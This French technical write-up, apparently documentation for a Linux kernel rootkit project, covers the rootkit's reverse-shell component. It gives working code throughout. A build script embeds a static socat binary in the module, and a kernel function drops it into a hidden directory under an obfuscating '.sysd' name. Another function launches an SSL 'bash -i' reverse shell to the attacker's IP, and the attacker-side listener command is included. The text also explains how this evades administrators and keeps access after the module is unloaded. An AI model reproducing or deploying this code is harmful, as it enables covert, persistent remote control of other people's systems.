\page reverse Reverse Shell
\tableofcontents

{#reverse-shell-doc}
Dans le cadre de notre projet, nous avons implémenté un reverse shell utilisant `socat` pour établir une connexion chiffrée SSL vers le serveur d'attaque. Le choix de `socat` est motivé par sa capacité à fournir un shell interactif complet, contrairement à des outils plus simples comme `netcat` ou même simplement `bash`.
Afin de pouvoir s'assurer de la présence de `socat` sur le système, nous avons intégré le binaire directement dans le rootkit, ce qui permet de le déposer dynamiquement lors du montage du rootkit. Cela demande d'avoir à disposition une version statique de `socat` embarquant aussi SSL, de dumper ce binaire dans le rootkit afin de pouvoir finalement l'utiliser pour établir le reverse shell.

### Chargement de socat dans le module en tant que payload

Pour charger le binaire `socat` dans le rootkit, nous utilisons un script lors de la compilation du module. Ce script extrait le binaire `socat` et le convertit en un tableau de caractères C, qui est ensuite intégré dans le code source du module.

```bash
generate_socat_h() {
  # if socat file does not exist, download it
  if [ ! -f socat ]; then
    echo "socat binary not found."
    echo "Download static socat binary from github.com/ernw/static-toolbox"
    wget https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.4/socat-1.7.4.4-x86_64 -O socat
    if [ $? -ne 0 ]; then
      echo "Failed to download socat binary."
      exit 1
    fi
    echo "Download complete."
  fi
  echo "Hexdumping socat to socat.h"
  xxd -i socat > include/socat.h
}

# Check if socat.h exists
if [ ! -f ./include/socat.h ]; then
  echo "socat.h not found, generating it..."
  generate_socat_h
else
  echo "socat.h already exists, skipping generation."
fi
```

À la suite de cela, nous obtenons finalement un fichier `socat.h` contenant le code suivant :

```c
unsigned char socat[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
  // ... (le reste du binaire socat)
};
unsigned long socat_len = 123456; // Longueur du binaire socat
```

### Déchargement du binaire sur la machine cible

Le binaire `socat` est déposé sur la machine cible grâce à la fonction `drop_socat_binaire(void)` :

```c
int drop_socat_binaire(void) {
    if (is_socat_binaire_dropped()) {
        DBG_MSG("drop_socat_binaire: socat binary already dropped\n");
        return SUCCESS;
    }

    struct file *f;
    loff_t pos = 0;

    f = filp_open(SOCAT_BINARY_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (IS_ERR(f)) {
        ERR_MSG("drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
        return -FAILURE;
    }

    unsigned int written = kernel_write(f, socat, socat_len, &pos);
    if (written < 0) {
        ERR_MSG("drop_socat_binaire: kernel_write failed: %u\n", written);
        filp_close(f, NULL);
        return -FAILURE;
    }
    else if (written < socat_len) {
        ERR_MSG("drop_socat_binaire: only %u bytes written, expected %u\n", written, socat_len);
        filp_close(f, NULL);
        return -FAILURE;
    }
    else {
        DBG_MSG("socat written successfully (%u bytes)\n", written);
    }

    filp_close(f, NULL);

    return SUCCESS;
}
```

Cette fonction vérifie d'abord si le binaire a déjà été déposé, puis crée et écrit le contenu du tableau `socat` (contenant le binaire) à l'emplacement défini par `SOCAT_BINARY_PATH`. Elle gère également les erreurs potentielles lors de l'écriture et s'assure que l'intégralité du binaire est bien écrite sur le disque.

> **Obfuscation et discrétion du binaire**
> Par défaut, le fichier `socat` déposé sur la machine cible est renommé avec l'extension `.sysd` afin d'ajouter une première couche d'obfuscation. De plus, il est placé dans le répertoire caché du rootkit, ce qui le rend pratiquement invisible pour un utilisateur ou un administrateur système classique. Ce choix vise à limiter les risques de détection du binaire par des outils d'analyse ou lors d'une inspection manuelle du système de fichiers.

### Exécution du reverse shell
Pour exécuter le reverse shell, nous utilisons la fonction `launch_reverse_shell(char *args)` :

```c
int launch_reverse_shell(char *args) {
  if (!is_socat_binaire_dropped()) {
    ERR_MSG("launch_reverse_shell: socat binary not dropped\n");
    return -FAILURE;
  }

  int port = REVERSE_SHELL_PORT; // Port par defaut

  // Recuperer le port
  if (args && strlen(args) > 0)
    port = simple_strtol(args, NULL, 10);

  // Construire la commande socat avec le port spécifié
  char cmd[256];
  snprintf(cmd, sizeof(cmd), "%s exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &",
          SOCAT_BINARY_PATH, ip, port);

  // Lancer la commande
  int ret_code = exec_str_as_command(cmd, false);

  if (ret_code < 0) {
    ERR_MSG("launch_reverse_shell: failed to start reverse shell on port %d\n", port);
    return ret_code;
  }

  DBG_MSG("launch_reverse_shell: reverse shell started on port %d\n", port);
  return SUCCESS;
}
```

Cette fonction vérifie d'abord que le binaire `socat` a bien été déposé. Elle récupère ensuite le port à utiliser (par défaut ou passé en argument), construit la commande d'exécution du reverse shell avec `socat`, puis l'exécute via `exec_str_as_command`. Les erreurs sont gérées et un message de succès est affiché si le shell est lancé correctement.

**Explication de la commande `socat` utilisée :**
```bash
socat exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:IP:PORT,verify=0 &
```
Cette commande `socat` établit une connexion SSL vers l'IP et le port spécifiés, tout en redirigeant l'entrée et la sortie standard vers un shell interactif `bash`. Les options utilisées sont :
| Option                        | Description                                                                                      |
|-------------------------------|--------------------------------------------------------------------------------------------------|
| `exec:bash -i`              | Exécute un shell interactif.                                                                     |
| `pty`                         | Alloue un pseudo-terminal pour le shell.                                                         |
| `stderr`                      | Redirige les erreurs vers la sortie standard.                                                    |
| `setsid`                      | Détache le processus du terminal.                                                                |
| `sigint`                      | Gère les signaux d'interruption.                                                                 |
| `sane`                        | Réinitialise les paramètres du terminal pour un comportement standard.                           |
| `openssl-connect:IP:PORT`     | Établit une connexion SSL vers l'IP et le port spécifiés.                                        |
| `verify=0`                    | Désactive la vérification du certificat SSL (utile pour les tests, mais à éviter en production). |

En somme, cette commande génère un shell sur mesure permettant ensuite d'ajouter un maximum d'interactivité et de fonctionnalités, tout en étant sécurisé par SSL.

### Reception de la connexion par l'attaquant {#reverse-shell-reception}
Pour recevoir la connexion du reverse shell, l'attaquant doit exécuter la commande suivante sur son serveur :

```bash
socat openssl-listen:9000,reuseaddr,cert="$(pwd)"/server.pem,verify=0 file:"$(tty)",raw,echo=0
```

Explications des options utilisées :
| Option                        | Description                                                                                      |
|-------------------------------|--------------------------------------------------------------------------------------------------|
| `openssl-listen:9000`         | Écoute les connexions entrantes sur le port 9000 en utilisant SSL.                               |
| `reuseaddr`                   | Permet de réutiliser l'adresse et le port, utile pour éviter les erreurs de "port déjà utilisé". |
| `cert="$(pwd)"/server.pem`    | Spécifie le certificat SSL à utiliser pour la connexion.                                         |
| `verify=0`                    | Désactive la vérification du certificat SSL (utile pour les tests, mais à éviter en production). |
| `file:"$(tty)",raw,echo=0`    | Redirige l'entrée/sortie vers le terminal actuel, en mode brut et sans écho.                      |

> **⚠️ Attention**  
> Le processus `socat` étant lancé dans un thread distinct du thread principal du module, il continue de s'exécuter même après le déchargement du rootkit. Cela présente l'avantage de maintenir un accès persistant à la machine cible, même si le rootkit doit être temporairement désactivé ou relancé. Cependant, il est important de garder à l'esprit que ce comportement peut laisser des traces (processus `socat` actif) et doit donc être pris en compte lors de l'utilisation ou de la suppression du module.

Dans le cadre de notre projet, nous avons automatisé le lancement de cette commande depuis l'interface web de l'attaquant, permettant ainsi de démarrer le reverse shell en un clic. 

> **Note**  
> Pour plus d'informations concernant le lancement côté attaquant, voir la section [Dashboard](#reverse-shell).

<img 
  src="logo_no_text.png" 
  style="
  display: block;
  margin: 100px auto;
  width: 30%;
  overflow: hidden;
  "
/>